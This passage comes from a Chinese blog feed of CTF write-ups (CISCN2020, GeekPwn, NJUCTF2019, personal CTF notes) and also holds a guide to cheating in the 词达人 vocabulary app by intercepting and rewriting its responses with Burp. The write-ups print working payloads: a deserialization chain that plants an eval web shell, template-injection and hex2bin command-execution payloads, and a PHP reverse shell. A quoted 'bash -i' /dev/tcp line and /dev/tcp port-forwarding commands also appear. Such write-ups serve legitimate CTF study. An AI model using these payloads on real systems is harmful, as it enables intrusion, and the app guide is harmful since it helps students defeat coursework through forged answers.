href="https://blog.csdn.net/March97/article/details/81222922">https://blog.csdn.net/March97/article/details/81222922</a></p><p>成功getflag</p><h5 id="至于其他的。。。-我太菜了，其他的都没做出来。"><a href="#至于其他的。。。-我太菜了，其他的都没做出来。" class="headerlink" title="至于其他的。。。 我太菜了，其他的都没做出来。"></a>至于其他的。。。 我太菜了，其他的都没做出来。</h5>]]></content>
    
    
    <categories>
      
      <category>CTf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>writeup</tag>
      
      <tag>强网杯</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2020 初赛WEB writeup</title>
    <link href="/2020/08/24/ciscncs.html"/>
    <url>/2020/08/24/ciscncs.html</url>
    
    <content type="html"><![CDATA[<h1 id="CISCN2020-初赛WEBwriteup"><a href="#CISCN2020-初赛WEBwriteup" class="headerlink" title="CISCN2020 初赛WEBwriteup"></a>CISCN2020 初赛WEBwriteup</h1><h3 id="babyunserialize"><a href="#babyunserialize" class="headerlink" title="babyunserialize"></a><strong>babyunserialize</strong></h3><p>题目给了源码</p><p>经过一番搜索（搜__destruct）找到了<code>image.php jig.php ws.php</code></p><p>查看了一番代码，发现jig.php里面有write函数，综合查看一番，是可以任意写文件的。</p><p>根据代码，写入初始化变量的值：</p><p><img src="/images/image-20200824104135895.png" alt="image-20200824104135895"></p><p>这样即可让它写到web根目录里面的shell.php中。</p><p>然后就是输出url编码的序列号字符串了：</p><p> <img src="/images/image-20200824104121782.png" alt="image-20200824104121782"></p><p>然后访问: </p><figure class="highlight js"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs js">/?flag=O%3A6%3A%22DB%5CJig%<span class="hljs-number">22</span>%3A6%3A%7Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00uuid%<span class="hljs-number">22</span>%3BN%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00dir%<span class="hljs-number">22</span>%3Bs%3A2%3A%<span class="hljs-number">22.</span>%2F%<span class="hljs-number">22</span>%3Bs%3A9%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00format%<span class="hljs-number">22</span>%3Bi%3A0%3Bs%3A6%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00log%<span class="hljs-number">22</span>%3BN%3Bs%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00data%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bs%3A9%3A%22shell.php%<span class="hljs-number">22</span>%3Ba%3A1%3A%7Bi%3A0%3Bs%3A26%3A%<span class="hljs-number">22</span>%3C%3Fphp+<span class="hljs-built_in">eval</span>%<span class="hljs-number">28</span>%24_POST%5B%27d%<span class="hljs-number">27</span>%5D%<span class="hljs-number">29</span>%3B%3F%3E%<span class="hljs-number">22</span>%3B%7D%7Ds%3A7%3A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%2A%00lazy%<span class="hljs-number">22</span>%3Bb%3A1%3B%7D<br></code></pre></td></tr></table></figure><p>即可成功getshell</p><p>然后通过phpinfo();查看环境变量里面的flag值即可。</p><p><img src="/images/image-20200824104108940.png" alt="image-20200824104108940"></p><h3 id="easytrick"><a href="#easytrick" class="headerlink" title="easytrick"></a><strong>easytrick</strong></h3><p>直接给了源代码，尝试过让trick1=array(“0”) trick2=array(1)</p><p>结果发现在__destruct中把trick1强制转为了字符串，直接变成了string(5) “Array”</p><p>后来发现当浮点数过大的时候会变成INF</p><p>所以让</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">$this</span>-&gt;trick1 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br><span class="hljs-keyword">$this</span>-&gt;trick2 = (<span class="hljs-keyword">float</span>)<span class="hljs-number">9e999</span>;<br></code></pre></td></tr></table></figure><p>最后得到序列化字符串：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">O</span>:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;trick&quot;</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick1&quot;</span>;d:INF;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;trick2&quot;</span>;d:INF;&#125;<br></code></pre></td></tr></table></figure><p>然后提交即可成功getflag</p><h3 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h3><p>很明显考察原型链污染。</p><p>查看源码就不说了</p><p>GET访问/SpawnPoint初始化session</p><p>查看代码发现使用 set-value，该js允许使用.来设置对应key的value</p><p>那么我们可以看到：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> Admin = &#123;<br>    <span class="hljs-string">&quot;password1&quot;</span>:process.env.p1,<br>    <span class="hljs-string">&quot;password2&quot;</span>:process.env.p2,<br>    <span class="hljs-string">&quot;password3&quot;</span>:process.env.p3<br>&#125;<br></code></pre></td></tr></table></figure><p>那么我们可以通过</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">setFn(req.session.knight, <span class="hljs-string">&quot;__proto__.password4&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br></code></pre></td></tr></table></figure><p>污染Admin这个object的键值对</p><p><img src="/images/image-20200824104400190.png" alt="image-20200824104400190"></p><p>然后再：</p><p><img src="/images/image-20200824104408894.png" alt="image-20200824104408894"></p><p>顺利得到flag</p><h3 id="rceme"><a href="#rceme" class="headerlink" title="rceme"></a><strong>rceme</strong></h3><p>直接给了代码，发现payload必须满足{if:xxxx}xxx{end if}格式</p><p>对于每一个xxx都会通过danger_key()过滤一下</p><p>综合一下还是采用hex2bin配合array_map绕过，把system /catflag都转成hex(array_filter也可以)</p><p>最终的payload为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">/?a=&#123;<span class="hljs-keyword">if</span>:array_map(hex2bin(<span class="hljs-string">&#x27;73797374656d&#x27;</span>),[hex2bin(<span class="hljs-string">&#x27;636174202f666c6167&#x27;</span>)])&#125;xxx&#123;end <span class="hljs-keyword">if</span>&#125;<br></code></pre></td></tr></table></figure><h3 id="另一个"><a href="#另一个" class="headerlink" title="另一个"></a>另一个</h3><p>题目忘了，没做出来，后来看了一下，让子进程异常就行了。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>writeup</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020GeekPwn-Cosplay题解</title>
    <link href="/2020/07/12/2020GeekPwn-Cosplay.html"/>
    <url>/2020/07/12/2020GeekPwn-Cosplay.html</url>
    
    <content type="html"><![CDATA[<h1 id="2020GeekPwn-Cosplay题解"><a href="#2020GeekPwn-Cosplay题解" class="headerlink" title="2020GeekPwn-Cosplay题解"></a>2020GeekPwn-Cosplay题解</h1><p>打开即可看到上传页面，</p><p><img src="/images/image-20200712223923626.png" alt="image-20200712223923626"></p><p>按照惯例查看源代码企图获取提示，前半部分不需要看，那是腾讯COS的JSSDK部分。</p><p>（至于为什么这么觉得，完全是看了下半部分推测出来的。下半部分是jssdk的上传文件功能，此页面并没有引入其他js，所以上面的复杂混淆代码一定是cos的sdk。）</p><p>可以看到：</p><p><img src="/images/image-20200712224128098.png" alt="image-20200712224128098"></p><p>初始化实例，获取临时的key用来上传。</p><p>先看sdk的文档（参考：<a href="https://cloud.tencent.com/document/product/436/11459），发现有了key之后就可以查看cos里面的具体文件，在控制台执行即可。">https://cloud.tencent.com/document/product/436/11459），发现有了key之后就可以查看cos里面的具体文件，在控制台执行即可。</a></p><p>具体的流程为：</p><ol><li>随便上传一个文件，让js获取到tempkey。</li><li>控制台执行代码即可查看所有文件。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">// 查询对象列表</span><br>cos.getBucket(&#123;<br>    <span class="hljs-attr">Bucket</span>: Bucket, <span class="hljs-comment">/* 必须 */</span><br>    <span class="hljs-attr">Region</span>: Region,     <span class="hljs-comment">/* 存储桶所在地域，必须字段 */</span><br>    <span class="hljs-attr">Prefix</span>: <span class="hljs-string">&#x27;&#x27;</span>,           <span class="hljs-comment">/* 非必须 */</span><br>&#125;, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(err || data.Contents);<br>&#125;);<br></code></pre></td></tr></table></figure><p>可以看到：</p><p><img src="/images/image-20200712224518339.png" alt="image-20200712224518339"></p><p>一看就是flag了。</p><p>调用文件下载api即可查看文件：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//文件下载</span><br>cos.getObject(&#123;<br>    <span class="hljs-attr">Bucket</span>: Bucket, <span class="hljs-comment">/* 必须 */</span><br>    <span class="hljs-attr">Region</span>: Region,     <span class="hljs-comment">/* 存储桶所在地域，必须字段 */</span><br>    <span class="hljs-attr">Key</span>: <span class="hljs-string">&#x27;f1L9@/flag.txt&#x27;</span>,              <span class="hljs-comment">/* 必须 */</span><br>&#125;, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) </span>&#123;<br>    <span class="hljs-built_in">console</span>.log(err || data.Body);<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="/images/image-20200712224705621.png" alt="image-20200712224705621"></p><p>成功得到flag。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>简简单单过词达人各种任务</title>
    <link href="/2020/03/04/jianjiandandancidaren.html"/>
    <url>/2020/03/04/jianjiandandancidaren.html</url>
    
    <content type="html"><![CDATA[<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><p>本文默认你具备使用burp的能力以及对json数据格式有所了解，并且可以为手机配置代理或者对安卓模拟器进行设置. 还需要你有配置https证书的能力。</p><hr><h1 id="2020-8-26更新"><a href="#2020-8-26更新" class="headerlink" title="2020/8/26更新"></a>2020/8/26更新</h1><h3 id="好像均已失效"><a href="#好像均已失效" class="headerlink" title="好像均已失效"></a>好像均已失效</h3><h1 id="2020-3-22更新"><a href="#2020-3-22更新" class="headerlink" title="2020/3/22更新"></a>2020/3/22更新</h1><p><img src="/images/image-20200322134517924.png" alt="image-20200322134517924"></p><h4 id="很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"><a href="#很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。" class="headerlink" title="很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。"></a>很遗憾现在的词达人已经从简简单单的http协议更换成了https协议。</h4><p>所以我们需要往您的手机导入安卓证书，这里操作如下。</p><p>访问代理ip地址，如我burp的ip地址为 172.16.20.107 端口为8080 那么我就访问<a href="http://172.16.20.107:8080/">http://172.16.20.107:8080/</a></p><p>点击右上角 CA cert*** 下载证书，下载的文件是der格式的，手机可能无法直接打开，需要改成cacert.crt就是把der改成crt文件。 具体操作参见：<a href="https://blog.csdn.net/wst0717/article/details/83787153">https://blog.csdn.net/wst0717/article/details/83787153</a></p><p><font color=green>注：导入后手机的状态栏会提示:网络可能会受到监控，正常现象</font></p><p>打开进行安装即可。这里不再截图。</p><p>然后现在只能改答案为true来欺骗客户端了，想改分需要拿到sign参数的具体文件，我有点懒，就不发出来了。。</p><p><font color=blue>祝你们好运！</font></p><h4 id="不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"><a href="#不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。" class="headerlink" title="不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。"></a>不一定需要burp，业界常见的fillder（好像是这么写的把）也可以。</h4><h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><h2 id="1-启动burpsuite2-1版本"><a href="#1-启动burpsuite2-1版本" class="headerlink" title="1.启动burpsuite2.1版本"></a>1.启动burpsuite2.1版本</h2><p>修改监听地址为:0.0.0.0:8080(本人在用这个，不想用这个也可以不用)</p><p><img src="/images/image-20200304212731446.png" alt="image-20200304212731446"></p><p><img src="/images/image-20200304212713261.png" alt="image-20200304212713261"></p><h2 id="2-手机修改代理服务器"><a href="#2-手机修改代理服务器" class="headerlink" title="2.手机修改代理服务器"></a>2.手机修改代理服务器</h2><p>手机修改wifi下的代理服务器，这里我本机局域网ip为172.20.16.107</p><p>所以我设置代理为172.20.16.107:8080</p><p>如图:</p><p><img src="/images/image-20200304212848065.png" alt="image-20200304212848065"></p><p>不知道自己的ip可以去路由器管理界面看，或者使用cmd命令ipconfig获取，其他方法也可以，无限制。</p><p>设置好后把proxy的拦截关掉</p><p><img src="/images/image-20200304212915940.png" alt="image-20200304212915940"></p><p>接下来http history会走过远远不断的流数据。</p><h1 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h1><p>我这里用<strong>词达人</strong>的某个自学任务测试</p><p>设置学习模式为快速模式(哈哈哈)</p><p><strong>选择所有单词</strong>后开始学习，第一类型题掠过，直接继续即可  <em>不怕麻烦可以少选几个，也没关系哈哈哈</em></p><p>再多说一嘴，就是这个第一个类型题也就是单纯为你朗读单词这个，是不算分数的。</p><p><img src="/images/image-20200304213348899.png" alt="image-20200304213348899"></p><p>到达此页面即可看到HTTP HISTORY最后一条<strong>POST</strong>的response</p><p><img src="/images/image-20200304213706254.png" alt="image-20200304213706254"></p><p>可以看到这里有answer:true的对应选项就是正确答案。<strong>不要着急选择</strong></p><p>进入options选项卡（不是user options，也就是我第一个图的地方）</p><p>下滑找到</p><p><img src="/images/image-20200304213940822.png" alt="image-20200304213940822"></p><p>点击Add按钮。</p><p>type选择response body也就是修改响应包的报文。</p><p><img src="/images/image-20200304214048764.png" alt="image-20200304214048764"></p><p>这里去手机那里选完答案点击继续。</p><p>下一题你就随便点击选项就可以了。</p><p><img src="/images/image-20200304214311276.png" alt="image-20200304214311276"></p><p>发现所有选项后面都带有小星星 ，就是修改成功了。</p><h1 id="收工"><a href="#收工" class="headerlink" title="收工"></a>收工</h1><h2 id="代理选择-无-即可"><a href="#代理选择-无-即可" class="headerlink" title="代理选择: 无 即可"></a>代理选择: 无 即可</h2><p><img src="/images/image-20200304214517300.png" alt="image-20200304214517300"></p><h2 id="然后关闭burp"><a href="#然后关闭burp" class="headerlink" title="然后关闭burp"></a>然后关闭burp</h2><p>感谢支持！</p>]]></content>
    
    
    <categories>
      
      <category>其他</category>
      
    </categories>
    
    
    <tags>
      
      <tag>词达人</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NJUCTF2019-部分wp</title>
    <link href="/2019/11/24/NJUCTF2019.html"/>
    <url>/2019/11/24/NJUCTF2019.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>虽然拿了一血但是是靠手速哈哈。</p><h1 id="web-replace"><a href="#web-replace" class="headerlink" title="web-replace"></a>web-replace</h1><p>既然这么出了一定是考replace.</p><p><img src="/images/image-20191124193302903.png" alt="image-20191124193302903"></p><p>提示php5.6 考虑到preg_replace 在新版本已经废弃。那么就是考preg_replace了。</p><p>首页三个框框:<img src="/images/image-20191124193404646.png" alt="image-20191124193404646"></p><p>目测是对应preg_replace 三个参数。</p><p> <code>preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] ) : mixed</code> </p><p>总的来说就是: <code>preg_replace(‘原来的文本’,‘替换的单词’,‘新单词’)</code></p><p>那么构造payload: <code>sub=jesen666&amp;pat=.*&amp;rep=eval($_POST[a])&amp;a=system(&#39;cat /flag&#39;);</code></p><p>post过去即可。。</p><h1 id="web-flask"><a href="#web-flask" class="headerlink" title="web-flask"></a>web-flask</h1><p>这题过于简单。。<img src="/images/image-20191124193919224.png" alt="image-20191124193919224"></p><p>进门这个点击以后看看，<img src="/images/image-20191124193932138.png" alt="image-20191124193932138"></p><p>修改以下url:<img src="/images/image-20191124193949934.png" alt="image-20191124193949934"></p><p>漏洞已经出现，这里直接放出payload。毕竟原理在网上已经有。</p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs python">http://nctf2019.x1ct34m.com:<span class="hljs-number">40007</span>/base1&#123;&#123;request[<span class="hljs-string">&#x27;__cl&#x27;</span>+<span class="hljs-string">&#x27;ass__&#x27;</span>].__base__.__base__.__base__[<span class="hljs-string">&#x27;__subcla&#x27;</span>+<span class="hljs-string">&#x27;sses__&#x27;</span>]()[<span class="hljs-number">60</span>][<span class="hljs-string">&#x27;__in&#x27;</span>+<span class="hljs-string">&#x27;it__&#x27;</span>][<span class="hljs-string">&#x27;__&#x27;</span>+<span class="hljs-string">&#x27;glo&#x27;</span>+<span class="hljs-string">&#x27;bal&#x27;</span>+<span class="hljs-string">&#x27;s__&#x27;</span>][<span class="hljs-string">&#x27;__bu&#x27;</span>+<span class="hljs-string">&#x27;iltins__&#x27;</span>][<span class="hljs-string">&#x27;ev&#x27;</span>+<span class="hljs-string">&#x27;al&#x27;</span>](<span class="hljs-string">&#x27;__im&#x27;</span>+<span class="hljs-string">&#x27;port__(&quot;os&quot;).po&#x27;</span>+<span class="hljs-string">&#x27;pen(&quot;cat /f&quot;+&quot;lag&quot;).re&#x27;</span>+<span class="hljs-string">&#x27;ad()&#x27;</span>)&#125;&#125;<br></code></pre></td></tr></table></figure><p>这里注意它过滤了flag字符，所以需要拆开flag后用+链接。。。</p><h1 id="web-hacker-backdoor"><a href="#web-hacker-backdoor" class="headerlink" title="web-hacker_backdoor"></a>web-hacker_backdoor</h1><p>给出代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>error_reporting(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;useful&#x27;</span>]))&#123;<br>    highlight_file(<span class="hljs-keyword">__file__</span>);<br>&#125;<br><span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-variable">$usrful</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;useful&#x27;</span>];<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>&#123;<br>    <span class="hljs-variable">$dangerous</span> = get_defined_functions();<br>    array_push(<span class="hljs-variable">$dangerous</span>[<span class="hljs-string">&quot;internal&quot;</span>], <span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;assert&#x27;</span>);<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$dangerous</span>[<span class="hljs-string">&quot;internal&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$bad</span>) &#123;<br>        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$a</span>,<span class="hljs-variable">$bad</span>) !== <span class="hljs-literal">FALSE</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>;<br>        <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$usrful</span>))&#123;<br>    <span class="hljs-keyword">if</span>(waf(<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;oh,不能输入这些函数哦 :) &quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析以下：需要get传入code和useful参数，useful参数需要是系统已经存在的文件。这里使用file:///etc/passwd</p><p>$dangerous数组，把内置函数全部取出，并加入eval和assert来阻止执行。</p><h2 id="研究绕过"><a href="#研究绕过" class="headerlink" title="研究绕过"></a>研究绕过</h2><p>这里我们可以在网上百度得到strpos一般是用数组绕过的,但是我在做题时候发现，我没有成功，紧接着查阅php.net文档，发现strpos是大小写敏感的。</p><p>那么就简单了。构造  <code>/?code=PhPinfO();&amp;useful=file:///etc/passwd</code>成功绕过。</p><h2 id="成功执行命令"><a href="#成功执行命令" class="headerlink" title="成功执行命令"></a>成功执行命令</h2><p>发现禁用了大多数函数，但是没有禁用fsockopen,proc_close和proc_open,那么完全可以反弹shell。</p><p>反弹代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sock</span>=fsockopen(<span class="hljs-string">&#x27;xxxxx&#x27;</span>,<span class="hljs-string">&#x27;xxx&#x27;</span>);<span class="hljs-comment">//ip and port</span><br><span class="hljs-variable">$descriptorspec</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span> =&gt; <span class="hljs-variable">$sock</span>,<span class="hljs-number">1</span> =&gt; <span class="hljs-variable">$sock</span>,<span class="hljs-number">2</span> =&gt; <span class="hljs-variable">$sock</span>);<br><span class="hljs-variable">$process</span>=proc_open(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, <span class="hljs-variable">$descriptorspec</span>, <span class="hljs-variable">$pipes</span>);<br>proc_close(<span class="hljs-variable">$process</span>);<br></code></pre></td></tr></table></figure><p>构造payload：<code>/?code=EVAL($_GET[a]);&amp;useful=file:///etc/passwd&amp;a=$sock=fsockopen(&#39;xx&#39;,&#39;xxxxx&#39;);$descriptorspec = array(0 =&gt; $sock,1 =&gt; $sock,2 =&gt; $sock);$process=proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);</code></p><p>这里为了观赏性，a是urldecode之后的，在利用的时候需要使用urlencode。</p><h1 id="misc-pip-install"><a href="#misc-pip-install" class="headerlink" title="misc-pip install"></a>misc-pip install</h1><p>官方给了个命令让安装<code>pip install --user nctf-2019-installme</code></p><p>果断安装，安装后发现源码只有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_flag</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Believe it or not. Flag is already in your machine. Can you find it?&#x27;</span><br></code></pre></td></tr></table></figure><p>那么只能去pypi官网，去官网查找<code>nctf-2019-installme</code>包，下载zip源码。在setup.py中发现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages<br><span class="hljs-keyword">import</span> tempfile<br><span class="hljs-keyword">from</span> os <span class="hljs-keyword">import</span> path, system<br><br>tmp_file = tempfile.gettempdir() + path.sep + <span class="hljs-string">&#x27;.f14g_is_here&#x27;</span><br>f = <span class="hljs-built_in">open</span>(tmp_file, <span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9&#x27;</span>)<br>f.close()<br><br><span class="hljs-comment"># system(&#x27;bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1&#x27;)</span><br><span class="hljs-comment"># Ohhhh, that a joke. I won&#x27;t do that. </span><br><br>setup(<br>    name=<span class="hljs-string">&#x27;nctf_2019_installme&#x27;</span>,<br>    version=<span class="hljs-number">0.2</span>,<br>    description=(<br>        <span class="hljs-string">&#x27;Get flagggggggggg!&#x27;</span><br>    ),<br>    author=<span class="hljs-string">&#x27;rmb122&#x27;</span>,<br>    author_email=<span class="hljs-string">&#x27;abuse@anti-spam.cn&#x27;</span>,<br>    license=<span class="hljs-string">&#x27;GPLv3.0&#x27;</span>,<br>    packages=find_packages(),<br>    platforms=[<span class="hljs-string">&quot;all&quot;</span>],<br>    keywords=[<span class="hljs-string">&#x27;nctf&#x27;</span>, <span class="hljs-string">&#x27;getflag&#x27;</span>],<br>    url=<span class="hljs-string">&#x27;http://www.google.com&#x27;</span><br>)<br></code></pre></td></tr></table></figure><p>解码base64<code>TkNURntjNHJlZnVsX2FiMHU3X2V2MWxfcGlwX3A0Y2thZ2V9</code>即可得到flag.</p><h1 id="结束"><a href="#结束" class="headerlink" title="结束"></a>结束</h1><p>还是很难的（对于我这种萌新来说），最可惜的结束phar那道题，有反序列化，但是没有找到对应的危险类，只有一个孤零零的curl。。。。静等赛后官方wp。唉唉唉。。。</p><p>但是。。。我很开心 哈哈哈。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web</tag>
      
      <tag>南京邮电CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTF的一些总结</title>
    <link href="/2019/11/11/zongjie_ctf.html"/>
    <url>/2019/11/11/zongjie_ctf.html</url>
    
    <content type="html"><![CDATA[<h1 id="CTF的一些总结"><a href="#CTF的一些总结" class="headerlink" title="CTF的一些总结"></a>CTF的一些总结</h1><p><u><strong>本篇文章非面向大众文章，仅供我本人查阅，一般只保证我本人能看懂</strong></u></p><h5 id="基本命令："><a href="#基本命令：" class="headerlink" title="基本命令："></a>基本命令：</h5><p>无其他文件进行端口转发</p><p> <code>exec 4&lt;&gt;/dev/tcp/127.0.0.1/3306;exec 5&lt;&gt;/dev/tcp/ip/9999;cat &lt;&amp;4 &gt;&amp;5 &amp;cat &lt;&amp;5 &gt;&amp;4;</code></p><p>curl -x 123.45.67.89:1080 -o page.html <a href="http://www.ip.cn">http://www.ip.cn</a> 代理访问</p><h5 id="简单绕过"><a href="#简单绕过" class="headerlink" title="简单绕过"></a>简单绕过</h5><p>parse_url: url中/全换成///</p><p>strpos 大小写敏感，数组绕过也可。</p><p>php后缀过滤 对ph开头的后缀进行一个fuzz(php php7 php5 phtml)</p><h5 id="基础知识点"><a href="#基础知识点" class="headerlink" title="基础知识点"></a>基础知识点</h5><p>php反序列化之后的变量，如果不是public，会有*和\x00修饰，不可见。</p><p>php://input 获取post 记得改POST方法（数据不会urldecode）</p><p>file_get_contents() file:// php:// zlib:// zip:// http://均可，且如果procol未知的话视为file://</p><p>phar协议突破文件包含首先1.php压缩为1.zip更改后缀名为.jpg上传，然后利用文件读取直接包含。</p><p><a href="http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马">http://www.c1sec.club/include.php?file=phar://upload/1.jpg/1这里的1指的是先前写好的1.php小马</a></p><p>.avi文件上传：<a href="https://github.com/neex/ffmpeg-avi-m3u-xbin">https://github.com/neex/ffmpeg-avi-m3u-xbin</a></p><p>能读文件，是apache的话记得读/etc/apache2/sites-available/000-default.conf，会有一些配置文件</p><p>上传文件后，如果服务器是linux系统，那么会在/tmp/目录下生成对应的临时文件，phpinfo();后看到<br>$query=’select * from flag where user=’.$user[0].’ and 